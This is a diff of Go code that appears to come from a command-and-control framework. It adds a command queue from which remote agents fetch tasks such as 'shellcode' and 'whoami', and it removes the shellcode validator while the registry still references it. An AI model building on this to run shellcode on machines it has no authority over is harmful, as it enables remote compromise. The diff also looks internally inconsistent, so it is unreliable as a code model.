@@ -2,17 +2,18 @@ package control
 
 import (
 	"encoding/json"
-	"fmt"
 	"log"
-	"os"
+	"sync"
 )
 
 // Registry of valid commands with their validators and processors
 var validCommands = map[string]struct {
 	Validator CommandValidator
+	Processor CommandProcessor
 }{
 	"shellcode": {
 		Validator: validateShellcodeCommand,
+		Processor: processShellcodeCommand,
 	},
 	"whoami": {},
 }
@@ -20,32 +21,42 @@ var validCommands = map[string]struct {
 // CommandValidator validates command-specific arguments
 type CommandValidator func(json.RawMessage) error
 
-// validateShellcodeCommand validates "shellcode" command arguments from client
-func validateShellcodeCommand(rawArgs json.RawMessage) error {
-	if len(rawArgs) == 0 {
-		return fmt.Errorf("shellcode command requires arguments")
+// CommandProcessor processes command-specific arguments
+type CommandProcessor func(json.RawMessage) (json.RawMessage, error)
+
+// CommandQueue stores commands ready for agent pickup
+type CommandQueue struct {
+	PendingCommands []CommandClient
+	mu              sync.Mutex
+}
+
+// AgentCommands is the global command queue
+var AgentCommands = CommandQueue{
+	PendingCommands: make([]CommandClient, 0),
+}
+
+// addCommand adds a validated command to the queue
+func (cq *CommandQueue) addCommand(command CommandClient) {
+	cq.mu.Lock()
+	defer cq.mu.Unlock()
+
+	cq.PendingCommands = append(cq.PendingCommands, command)
+	log.Printf("QUEUED: %s", command.Command)
+}
+
+// GetCommand retrieves and removes the next command from queue
+func (cq *CommandQueue) GetCommand() (CommandClient, bool) {
+	cq.mu.Lock()
+	defer cq.mu.Unlock()
+
+	if len(cq.PendingCommands) == 0 {
+		return CommandClient{}, false
 	}
 
-	var args ShellcodeArgsClient
+	cmd := cq.PendingCommands[0]
+	cq.PendingCommands = cq.PendingCommands[1:]
 
-	if err := json.Unmarshal(rawArgs, &args); err != nil {
-		return fmt.Errorf("invalid argument format: %w", err)
-	}
+	log.Printf("DEQUEUED: Command '%s'", cmd.Command)
 
-	if args.FilePath == "" {
-		return fmt.Errorf("file_path is required")
-	}
-
-	if args.ExportName == "" {
-		return fmt.Errorf("export_name is required")
-	}
-
-	// Check if file exists
-	if _, err := os.Stat(args.FilePath); os.IsNotExist(err) {
-		return fmt.Errorf("file does not exist: %s", args.FilePath)
-	}
-
-	log.Printf("Validation passed: file_path=%s, export_name=%s", args.FilePath, args.ExportName)
-
-	return nil
+	return cmd, true
 }
